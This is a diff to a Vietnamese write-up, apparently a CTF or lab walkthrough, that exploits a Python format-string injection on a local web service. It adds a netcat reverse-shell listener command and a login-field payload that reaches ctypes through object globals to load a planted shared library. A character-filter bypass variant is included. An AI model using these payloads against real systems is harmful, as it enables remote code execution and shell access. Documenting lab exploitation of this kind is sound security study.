@@ -362,10 +362,15 @@ Công việc còn lại của chúng ta đơn giản là gửi payload lên:
 curl 127.0.0.1:5002 -X POST --data-urlencode "username=admin" --data-urlencode "password@output.txt"
 ```
 
-Nghe reverse shell 
+Nghe reverse shell:
+```bash
+nc -lvnp 4242
+```
 
-Load thư viện này vào bằng cách gửi `{a.__class__.__init__.__globals__[ctypes].cdll['/var/run/mysqld/hello123.so']}{a}`:
-
-```curl
+Sau đó load thư viện này vào bằng cách gửi `{a.__class__.__init__.__globals__[ctypes].cdll['/var/run/mysqld/hello123.so']}{a}`:
 
 ```
+username : admin
+password : {{a.__class__.__init__.__globals__[ctypes].cdll[{a.FORBIDDEN_CHARACTERS[7]}var{a.FORBIDDEN_CHARACTERS[7]}run{a.FORBIDDEN_CHARACTERS[7]}mysqld{a.FORBIDDEN_CHARACTERS[7]}hello123.so]}}{{a}}{a}
+```
+![[Attachments/Pasted image 20261119115026.png]]
